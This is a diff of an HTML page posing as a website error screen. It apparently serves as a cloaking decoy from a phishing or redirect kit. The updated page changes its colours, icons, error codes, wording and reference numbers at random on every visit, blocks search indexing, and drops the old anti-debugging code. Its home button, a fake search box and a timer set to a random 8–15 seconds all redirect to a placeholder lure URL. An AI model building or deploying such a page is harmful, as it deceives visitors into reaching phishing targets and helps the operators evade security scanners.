@@ -3,106 +3,314 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Access Denied - Error 404</title>
+    <meta name="robots" content="noindex, nofollow">
+    <title id="pageTitle">Page Not Found</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        :root {
+            --primary-h: 250;
+            --primary-s: 70%;
+            --primary-l: 55%;
         }
-        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, hsl(var(--primary-h), var(--primary-s), 45%) 0%, hsl(calc(var(--primary-h) + 30), var(--primary-s), 50%) 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
-            justify-center;
+            justify-content: center;
             color: #333;
+            padding: 20px;
         }
-        
         .container {
             background: white;
-            padding: 60px 40px;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            padding: clamp(40px, 8vw, 60px) clamp(30px, 6vw, 50px);
+            border-radius: 24px;
+            box-shadow: 0 25px 80px rgba(0,0,0,0.25);
             text-align: center;
-            max-width: 500px;
-            margin: 20px;
+            max-width: 520px;
+            width: 100%;
+            animation: slideUp 0.5s ease-out;
         }
-        
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .error-icon {
+            font-size: clamp(60px, 12vw, 90px);
+            margin-bottom: 20px;
+            animation: bounce 2s ease-in-out infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
         .error-code {
-            font-size: 120px;
+            font-size: clamp(80px, 15vw, 120px);
             font-weight: 800;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, hsl(var(--primary-h), var(--primary-s), 45%) 0%, hsl(calc(var(--primary-h) + 30), var(--primary-s), 50%) 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            margin-bottom: 20px;
+            background-clip: text;
+            margin-bottom: 15px;
+            line-height: 1;
         }
-        
         h1 {
-            font-size: 32px;
+            font-size: clamp(24px, 5vw, 32px);
             margin-bottom: 15px;
             color: #2d3748;
         }
-        
         p {
-            font-size: 18px;
+            font-size: clamp(14px, 3vw, 18px);
             color: #718096;
             margin-bottom: 30px;
             line-height: 1.6;
         }
-        
+        .suggestions {
+            background: #f7fafc;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 30px;
+            text-align: left;
+        }
+        .suggestions h3 {
+            font-size: 14px;
+            color: #4a5568;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .suggestions ul {
+            list-style: none;
+            font-size: 13px;
+            color: #718096;
+        }
+        .suggestions li {
+            padding: 8px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .suggestions li::before {
+            content: '→';
+            color: hsl(var(--primary-h), var(--primary-s), var(--primary-l));
+        }
         .btn {
             display: inline-block;
-            padding: 15px 40px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 14px 36px;
+            background: linear-gradient(135deg, hsl(var(--primary-h), var(--primary-s), 45%) 0%, hsl(calc(var(--primary-h) + 30), var(--primary-s), 50%) 100%);
             color: white;
             text-decoration: none;
             border-radius: 50px;
             font-weight: 600;
-            font-size: 16px;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
         }
-        
         .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px hsla(var(--primary-h), var(--primary-s), var(--primary-l), 0.4);
         }
-        
-        .icon {
-            font-size: 80px;
-            margin-bottom: 20px;
+        .btn:active { transform: translateY(-1px); }
+        .search-box {
+            margin-top: 25px;
+            display: flex;
+            gap: 10px;
+            max-width: 350px;
+            margin-left: auto;
+            margin-right: auto;
         }
+        .search-box input {
+            flex: 1;
+            padding: 12px 18px;
+            border: 2px solid #e2e8f0;
+            border-radius: 25px;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .search-box input:focus {
+            border-color: hsl(var(--primary-h), var(--primary-s), var(--primary-l));
+        }
+        .search-box button {
+            padding: 12px 20px;
+            background: hsl(var(--primary-h), var(--primary-s), var(--primary-l));
+            color: white;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background 0.2s;
+        }
+        .search-box button:hover {
+            background: hsl(var(--primary-h), var(--primary-s), calc(var(--primary-l) - 5%));
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #a0aec0;
+        }
+        .footer span { display: block; margin-top: 5px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="icon">🔒</div>
-        <div class="error-code">404</div>
-        <h1>Page Not Found</h1>
-        <p>The page you're looking for doesn't exist or has been moved.</p>
-        <a href="https://www.google.com" class="btn">Go Back Home</a>
-    </div>
-    
-    <script>
-        // Anti-debugging
-        (function() {
-            var _0xcheck = function() {
-                var start = new Date().getTime();
-                debugger;
-                var end = new Date().getTime();
-                if (end - start > 100) {
-                    window.location.href = 'https://www.google.com';
-                }
-            };
-            setInterval(_0xcheck, 2000);
-        })();
+        <div class="error-icon" id="errorIcon">🔍</div>
+        <div class="error-code" id="errorCode">404</div>
+        <h1 id="errorTitle">Page Not Found</h1>
+        <p id="errorMessage">The page you're looking for doesn't exist or has been moved to a new location.</p>
         
-        // Redirect after delay
+        <div class="suggestions" id="suggestions">
+            <h3><span>💡</span> <span id="suggestTitle">Try these instead:</span></h3>
+            <ul id="suggestionList"></ul>
+        </div>
+        
+        <button class="btn" id="homeBtn">Go to Homepage</button>
+        
+        <div class="search-box">
+            <input type="text" placeholder="Search our site..." id="searchInput">
+            <button id="searchBtn">🔍</button>
+        </div>
+        
+        <div class="footer">
+            <span id="errorRef"></span>
+        </div>
+    </div>
+
+    <script>
+    (function(){
+        'use strict';
+        
+        // Seeded random for per-visit uniqueness
+        var _0x = {
+            seed: Date.now() ^ (Math.random() * 0xFFFFFFFF >>> 0),
+            rand: function(min, max) {
+                this.seed = (this.seed * 1103515245 + 12345) & 0x7FFFFFFF;
+                return min + (this.seed % (max - min + 1));
+            },
+            randHex: function(len) {
+                var chars = '0123456789abcdef';
+                var result = '';
+                for(var i = 0; i < len; i++) result += chars[this.rand(0, 15)];
+                return result;
+            }
+        };
+        
+        // Dynamic theming
+        var themes = [
+            {h: 250, s: 70, l: 55},  // Purple
+            {h: 220, s: 75, l: 50},  // Blue
+            {h: 340, s: 70, l: 50},  // Pink
+            {h: 200, s: 80, l: 45},  // Cyan
+            {h: 280, s: 65, l: 55}   // Violet
+        ];
+        var theme = themes[_0x.rand(0, themes.length - 1)];
+        document.documentElement.style.setProperty('--primary-h', theme.h);
+        document.documentElement.style.setProperty('--primary-s', theme.s + '%');
+        document.documentElement.style.setProperty('--primary-l', theme.l + '%');
+        
+        // Dynamic error icons
+        var icons = ['🔍', '🔒', '🚫', '⚠️', '🔐', '📭', '🛑'];
+        document.getElementById('errorIcon').textContent = icons[_0x.rand(0, icons.length - 1)];
+        
+        // Dynamic error codes (all valid HTTP error codes)
+        var errorCodes = ['404', '403', '410', '451'];
+        var errorCode = errorCodes[_0x.rand(0, errorCodes.length - 1)];
+        document.getElementById('errorCode').textContent = errorCode;
+        
+        // Dynamic titles and messages based on error code
+        var errorContent = {
+            '404': {
+                titles: ['Page Not Found', 'Oops! Nothing Here', 'Lost in Space'],
+                messages: [
+                    "The page you're looking for doesn't exist or has been moved.",
+                    "We couldn't find what you were looking for.",
+                    "This page seems to have wandered off."
+                ]
+            },
+            '403': {
+                titles: ['Access Denied', 'Permission Required', 'Restricted Area'],
+                messages: [
+                    "You don't have permission to access this resource.",
+                    "This area requires special authorization.",
+                    "Access to this page is restricted."
+                ]
+            },
+            '410': {
+                titles: ['Page Gone', 'Content Removed', 'No Longer Available'],
+                messages: [
+                    "This content has been permanently removed.",
+                    "The page you requested is no longer available.",
+                    "This resource has been intentionally removed."
+                ]
+            },
+            '451': {
+                titles: ['Unavailable', 'Content Blocked', 'Access Restricted'],
+                messages: [
+                    "This content is not available in your region.",
+                    "Access to this page has been restricted.",
+                    "This resource is currently unavailable."
+                ]
+            }
+        };
+        
+        var content = errorContent[errorCode];
+        document.getElementById('errorTitle').textContent = content.titles[_0x.rand(0, content.titles.length - 1)];
+        document.getElementById('errorMessage').textContent = content.messages[_0x.rand(0, content.messages.length - 1)];
+        document.getElementById('pageTitle').textContent = 'Error ' + errorCode + ' - ' + document.getElementById('errorTitle').textContent;
+        
+        // Dynamic suggestions
+        var suggestionSets = [
+            ['Check the URL for typos', 'Return to the homepage', 'Use the search function', 'Contact support if needed'],
+            ['Verify the link is correct', 'Go back to previous page', 'Browse our main sections', 'Report this issue'],
+            ['Double-check the address', 'Visit our homepage', 'Try searching for content', 'Clear your browser cache']
+        ];
+        var suggestions = suggestionSets[_0x.rand(0, suggestionSets.length - 1)];
+        var suggestionHtml = '';
+        for(var i = 0; i < suggestions.length; i++) {
+            suggestionHtml += '<li>' + suggestions[i] + '</li>';
+        }
+        document.getElementById('suggestionList').innerHTML = suggestionHtml;
+        
+        // Dynamic suggestion titles
+        var suggestTitles = ['Try these instead:', 'What you can do:', 'Helpful suggestions:', 'Quick fixes:'];
+        document.getElementById('suggestTitle').textContent = suggestTitles[_0x.rand(0, suggestTitles.length - 1)];
+        
+        // Dynamic error reference
+        var refId = 'ERR-' + _0x.randHex(8).toUpperCase();
+        document.getElementById('errorRef').textContent = 'Reference: ' + refId + ' | ' + new Date().toISOString().split('T')[0];
+        
+        // Button handlers
+        document.getElementById('homeBtn').addEventListener('click', function() {
+            this.textContent = 'Redirecting...';
+            this.style.opacity = '0.7';
+            setTimeout(function() {
+                window.location.assign({lure_url_js});
+            }, _0x.rand(500, 1500));
+        });
+        
+        document.getElementById('searchBtn').addEventListener('click', function() {
+            var query = document.getElementById('searchInput').value;
+            if(query.trim()) {
+                document.getElementById('homeBtn').click();
+            }
+        });
+        
+        document.getElementById('searchInput').addEventListener('keypress', function(e) {
+            if(e.key === 'Enter') {
+                document.getElementById('searchBtn').click();
+            }
+        });
+        
+        // Natural redirect after delay (no anti-debugging)
+        var redirectDelay = _0x.rand(8000, 15000);
         setTimeout(function() {
-            window.location.href = 'https://www.google.com';
-        }, 5000);
+            window.location.assign({lure_url_js});
+        }, redirectDelay);
+        
+    })();
     </script>
 </body>
 </html>
